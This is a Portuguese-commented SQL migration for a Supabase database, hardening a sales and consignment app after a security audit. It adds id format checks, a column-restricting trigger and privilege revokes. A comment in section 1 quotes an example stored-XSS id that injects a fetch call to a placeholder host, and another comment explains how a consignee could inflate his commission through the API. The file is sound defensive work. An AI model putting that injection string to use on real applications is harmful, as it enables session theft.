-- =====================================================================================
-- KANJŌ · auditoria de segurança de 23/10/2026 — correções de falha clara
-- Projeto: JAPAO (ref hzlpicbocgsdfuifanqs, sa-east-1). Confira no topo do SQL Editor.
--
-- ORDEM: pode rodar antes ou depois do push do HTML deste mesmo PR — nada aqui depende do
-- HTML novo, e o HTML novo não depende deste SQL. Tudo é idempotente (pode rodar de novo).
--
-- O que NÃO está aqui (depende de decisão, ver perguntas no relatório da auditoria):
-- trava da comissão do Samuel (2.A do correcao_seguranca.sql), e-mail por username para
-- anônimo (2.C), bucket GAKKIJAPAO, jogo "quarteto" no mesmo projeto, senha do Diego.
-- =====================================================================================

begin;

-- -------------------------------------------------------------------------------------
-- 1. [XSS ARMAZENADO] Formato fixo para os ids
--    O HTML monta `onclick="abrirCompra('<id>')"` com o id cru. Quem grava em `compras` ou
--    `pagamentos` (o Samuel, pela API) ou altera uma linha de `vendas` (o Diego, pela API,
--    nas linhas consignadas) escolhe o id — um id como  x');fetch('//mal/'+...);//  roda
--    JavaScript na sessão do Ulisses quando ele abre a aba. O HTML deste PR já não usa o id
--    em JavaScript, mas o HTML velho fica em cache; o banco fecha para todas as versões.
--    O app gera ids como prefixo + base36 (uid()), e os ids semeados são c1, v22b, c8i1a…
--    Conferido em 23/10: 0 linhas fora do padrão nas três tabelas.
-- -------------------------------------------------------------------------------------
alter table public.compras    drop constraint if exists compras_id_formato;
alter table public.compras    add  constraint compras_id_formato    check (id ~ '^[A-Za-z0-9_-]{1,64}$');
alter table public.pagamentos drop constraint if exists pagamentos_id_formato;
alter table public.pagamentos add  constraint pagamentos_id_formato check (id ~ '^[A-Za-z0-9_-]{1,64}$');
alter table public.vendas     drop constraint if exists vendas_id_formato;
alter table public.vendas     add  constraint vendas_id_formato     check (
  id ~ '^[A-Za-z0-9_-]{1,64}$'
  and (compra_id is null or compra_id ~ '^[A-Za-z0-9_-]{1,64}$')
  and (item_id   is null or item_id   ~ '^[A-Za-z0-9_-]{1,64}$'));

-- -------------------------------------------------------------------------------------
-- 2. [DINHEIRO] O consignado só altera o que a tela dele altera
--    A policy vendas_consig_upd libera UPDATE de QUALQUER coluna das linhas consignadas.
--    A comissão do Diego é 50% × (vendido − custo_consignado): pela API ele zera o
--    `custo_consignado` e a comissão dele dobra; ou mexe em `custo`, `sugerido`, `produto`.
--    A tela dele (salvarConsig) só manda: cliente, forma, vendido, recebido, dvenda, status,
--    obs, updated_at — e status só 'consignacao' ou 'entregue'. A trava abaixo é exatamente
--    isso; nada que a tela faz deixa de funcionar. Comprador não é afetado.
--    session_user/current_user não servem aqui (PostgREST roda tudo como `authenticated`);
--    quem separa os perfis é o app_metadata.role do JWT, que só o servidor do Auth assina.
-- -------------------------------------------------------------------------------------
create or replace function public.fn_vendas_trava_consignado()
returns trigger
language plpgsql
set search_path = ''
as $fn$
begin
  if coalesce(auth.jwt() -> 'app_metadata' ->> 'role', '') <> 'consignado' then
    return new;
  end if;

  if (to_jsonb(new) - array['cliente','forma','vendido','recebido','dvenda','status','obs','updated_at'])
     is distinct from
     (to_jsonb(old) - array['cliente','forma','vendido','recebido','dvenda','status','obs','updated_at']) then
    raise exception 'Consignado so altera cliente, forma, valores vendido/recebido, data, status e observacao.';
  end if;

  if new.status not in ('consignacao', 'entregue') then
    raise exception 'Status invalido para consignado.';
  end if;

  return new;
end;
$fn$;

revoke all on function public.fn_vendas_trava_consignado() from public, anon, authenticated;

drop trigger if exists trg_vendas_trava_consignado on public.vendas;
create trigger trg_vendas_trava_consignado
  before update on public.vendas
  for each row execute function public.fn_vendas_trava_consignado();

-- -------------------------------------------------------------------------------------
-- 3. Funções SECURITY DEFINER chamáveis por quem não deveria
--    `revoke ... from public` não tira o grant DIRETO que o Supabase dá a anon/authenticated
--    em toda função nova — por isso os papéis vão nomeados.
--    · fn_log é função de TRIGGER: ninguém chama por RPC. Trigger dispara sem checar EXECUTE,
--      então a auditoria em `logs` continua igual. search_path vazio (tudo já é qualificado).
--    · registrar_meu_email só faz sentido logado; para anon devolvia false, mas não precisa
--      estar exposta.
-- -------------------------------------------------------------------------------------
revoke execute on function public.fn_log() from public, anon, authenticated;
alter function public.fn_log() set search_path = '';

revoke execute on function public.registrar_meu_email(text) from public, anon;
grant  execute on function public.registrar_meu_email(text) to authenticated;

-- -------------------------------------------------------------------------------------
-- 4. Policies dormentes em `usuarios`
--    A tabela foi fechada por GRANT em 31/08 (correcao_seguranca.sql PARTE 1), mas ficaram
--    `usuarios_select` (anon+authenticated, using true) e `usuarios_update`. Hoje não valem
--    porque não há grant; no dia em que um script reconceder `grant all`, a leitura dos
--    e-mails reabre para anônimo e cada um pode trocar o próprio username para 'ulisses'.
--    O app não usa mais a tabela (só as RPCs SECURITY DEFINER, que ignoram RLS).
-- -------------------------------------------------------------------------------------
drop policy if exists usuarios_select on public.usuarios;
drop policy if exists usuarios_update on public.usuarios;

-- -------------------------------------------------------------------------------------
-- 5. Privilégios que nenhum fluxo usa
--    · TRUNCATE ignora RLS. Não é exposto pelo PostgREST, mas é privilégio sobrando.
--    · anon nunca escreve nada no KANJŌ (tudo acontece depois do login). Leitura do anon
--      fica como está: a RLS já devolve vazio e o app pode consultar antes da sessão subir.
--    · `logs` só é gravada pelo trigger (SECURITY DEFINER, dono postgres); o cliente só lê.
-- -------------------------------------------------------------------------------------
revoke truncate, references, trigger on public.compras, public.pagamentos, public.vendas,
  public.config, public.logs from anon, authenticated;
revoke insert, update, delete on public.compras, public.pagamentos, public.vendas,
  public.config, public.logs from anon;
revoke insert, update, delete on public.logs from authenticated;

commit;

-- =====================================================================================
-- CONFERÊNCIA (rodar depois; tudo só leitura)
-- (a) esperado: anon_x=false nas duas primeiras; registrar_meu_email auth_x=true
-- select p.proname, has_function_privilege('anon',p.oid,'execute') anon_x,
--        has_function_privilege('authenticated',p.oid,'execute') auth_x
--   from pg_proc p where p.pronamespace='public'::regnamespace
--    and p.proname in ('fn_log','registrar_meu_email','fn_vendas_trava_consignado');
-- (b) esperado: nenhuma linha
-- select policyname from pg_policies where schemaname='public' and tablename='usuarios';
-- (c) esperado: 3 constraints e 1 trigger novo
-- select conname from pg_constraint where conname like '%_id_formato';
-- select tgname from pg_trigger where tgname='trg_vendas_trava_consignado';
-- (d) a auditoria segue gravando: edite e salve qualquer compra no app e veja a aba Logs.
--
-- PARA DESFAZER, se algo inesperado quebrar:
-- drop trigger if exists trg_vendas_trava_consignado on public.vendas;
-- alter table public.compras drop constraint if exists compras_id_formato;
-- alter table public.pagamentos drop constraint if exists pagamentos_id_formato;
-- alter table public.vendas drop constraint if exists vendas_id_formato;
-- =====================================================================================
